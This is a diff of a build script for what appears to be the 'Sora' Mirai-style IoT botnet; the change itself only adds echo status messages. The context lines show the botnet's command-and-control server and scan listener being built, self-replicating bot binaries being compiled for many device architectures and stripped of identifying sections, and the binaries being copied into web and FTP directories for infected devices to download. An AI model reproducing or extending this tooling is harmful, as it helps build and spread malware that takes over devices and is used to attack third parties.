@@ -17,6 +17,7 @@ function compile_bot {
     "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
 }
 
+echo -e "\e[01;36mCompile CnC\e[0m"
 rm -rf ~/release
 mkdir ~/release
 rm -rf /var/www/html
@@ -30,7 +31,9 @@ go build -o loader/cnc cnc/*.go
 rm -rf ~/cnc
 mv ~/loader/cnc ~/
 go build -o loader/scanListen scanListen.go
+echo -e "\e[01;36mDone\e[0m"
 
+echo -e "\e[01;36mCompile bot\e[0m"
 compile_bot i586 sora.x86 "-static -DSELFREP"
 compile_bot mips sora.mips "-static -DSELFREP"
 compile_bot mipsel sora.mpsl "-static -DSELFREP"
@@ -42,6 +45,7 @@ compile_bot powerpc sora.ppc "-static -DSELFREP"
 compile_bot sparc sora.spc "-static -DSELFREP"
 compile_bot m68k sora.m68k "-static -DSELFREP"
 compile_bot sh4 sora.sh4 "-static -DSELFREP"
+echo -e "\e[01;36mDone\e[0m"
 
 cp release/sora.* /var/www/html/bins
 cp release/sora.* /var/ftp
